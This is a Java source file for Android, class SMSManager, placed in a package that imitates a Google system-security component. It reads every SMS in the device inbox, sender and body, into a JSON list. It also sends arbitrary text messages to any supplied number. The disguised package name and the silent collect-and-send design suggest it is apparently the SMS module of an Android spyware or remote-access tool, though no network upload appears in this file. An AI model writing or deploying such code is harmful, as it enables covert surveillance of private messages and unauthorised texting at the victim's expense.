package com.google.android.sys.security;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by sys_security on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList(){
        Cursor cur = null;
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            if (cur != null) {
                while (cur.moveToNext()) {
                    try {
                        JSONObject sms = new JSONObject();
                        int addressIndex = cur.getColumnIndex("address");
                        int bodyIndex = cur.getColumnIndex("body");
                        
                        if (addressIndex >= 0 && bodyIndex >= 0) {
                            String address = cur.getString(addressIndex);
                            String body = cur.getString(bodyIndex);
                            
                            sms.put("phoneNo", address != null ? address : "Unknown");
                            sms.put("msg", body != null ? body : "");
                            list.put(sms);
                        }
                    } catch (Exception e) {
                        // Skip this SMS if error, continue with others
                        Log.e("SMSManager", "Error reading individual SMS", e);
                    }
                }
            }
            
            SMSList.put("smsList", list);
            Log.d("SMSManager", "Collected " + list.length() + " SMS messages");
            return SMSList;
            
        } catch (Exception e) {
            Log.e("SMSManager", "Error reading SMS list", e);
            return null;
        } finally {
            // Always close cursor to prevent memory leak
            if (cur != null) {
                try {
                    cur.close();
                } catch (Exception e) {
                    Log.e("SMSManager", "Error closing cursor", e);
                }
            }
        }
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            // Validate inputs
            if (phoneNo == null || phoneNo.trim().isEmpty()) {
                Log.e("SMSManager", "Invalid phone number");
                return false;
            }
            
            if (msg == null) {
                msg = "";
            }
            
            SmsManager smsManager = SmsManager.getDefault();
            
            // If message is too long, split it
            if (msg.length() > 160) {
                java.util.ArrayList<String> parts = smsManager.divideMessage(msg);
                smsManager.sendMultipartTextMessage(phoneNo, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            }
            
            Log.d("SMSManager", "SMS sent successfully to " + phoneNo);
            return true;
            
        } catch (SecurityException e) {
            Log.e("SMSManager", "Permission denied - SEND_SMS not granted", e);
            return false;
        } catch (IllegalArgumentException e) {
            Log.e("SMSManager", "Invalid phone number or message", e);
            return false;
        } catch (Exception e) {
            Log.e("SMSManager", "Error sending SMS", e);
            return false;
        }
    }

}
